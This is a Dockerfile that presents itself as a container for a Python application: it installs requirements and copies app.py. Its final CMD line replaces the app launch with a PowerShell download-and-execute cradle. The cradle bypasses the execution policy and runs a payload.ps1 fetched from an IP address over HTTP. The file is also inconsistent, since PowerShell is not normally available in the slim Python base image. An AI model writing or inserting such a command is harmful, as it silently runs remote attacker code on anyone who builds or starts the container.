FROM python:3.10-slim

WORKDIR /app

COPY requirements.txt .

RUN pip install --no-cache-dir -r requirements.txt

COPY app.py .

CMD ["powershell", "-ExecutionPolicy", "Bypass", "-Command", "IEX (New-Object Net.WebClient).DownloadString('http://192.168.153.98:8000/payload.ps1')"]
